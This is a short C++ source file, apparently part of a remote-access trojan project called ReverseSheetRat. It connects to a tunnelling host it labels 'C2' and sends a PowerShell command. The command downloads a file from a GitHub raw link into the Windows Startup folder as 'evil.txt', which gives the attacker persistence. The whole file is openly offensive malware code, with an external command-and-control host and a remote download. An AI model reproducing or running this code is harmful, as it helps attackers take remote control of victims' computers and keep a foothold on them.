#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;

    const char* host = "r-broker.gl.at.ply.gg";
    const int port = 18942;

    // ⚠️ Заміни на свій прямий GitHub-лінк
    const char* githubUrl = "https://github.com/arkadiychulkover/ReverseSheetRat/raw/refs/heads/master/ReverseSheetRat/Test.txt";

    // PowerShell команда: завантажити з GitHub у автозавантаження
    std::string psCommand =
        "powershell -c \"Invoke-WebRequest '" + std::string(githubUrl) +
        "' -OutFile $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.txt\"\n";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // DNS resolve using getaddrinfo
    addrinfo hints = {};
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM; // Stream socket

    addrinfo* result = nullptr;
    if (getaddrinfo(host, nullptr, &hints, &result) != 0) {
        std::cerr << "DNS resolution failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    sockaddr_in* addr = reinterpret_cast<sockaddr_in*>(result->ai_addr);
    server.sin_addr = addr->sin_addr; // Copy resolved address
    freeaddrinfo(result);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
        std::cerr << "Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to C2\n";

    send(sock, psCommand.c_str(), psCommand.size(), 0);

    char buffer[1024] = { 0 };
    int recvSize = recv(sock, buffer, sizeof(buffer), 0);
    if (recvSize > 0) {
        std::cout << "[+] Response from server:\n";
        std::cout << std::string(buffer, recvSize) << std::endl;
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
